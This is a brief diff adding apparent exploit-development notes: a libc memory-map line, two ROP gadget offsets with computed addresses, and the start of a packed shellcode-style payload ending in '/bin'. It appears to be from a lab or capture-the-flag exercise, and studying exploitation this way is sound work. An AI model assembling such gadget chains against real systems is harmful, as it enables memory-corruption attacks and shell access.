@@ -1,0 +1,9 @@
+b7e20000-b7fc4000 r-xp 00000000 08:01 28443532   /lib/i386-linux-gnu/libc-2.15.so
+
+0x32ee0L: xor eax eax ;;
+add=b7e52ee0
+
+0x2404fL: pop eax ;;
+add=b7e4404f
+"\x4f\x40\xe4\xb7"+"/bin"
+
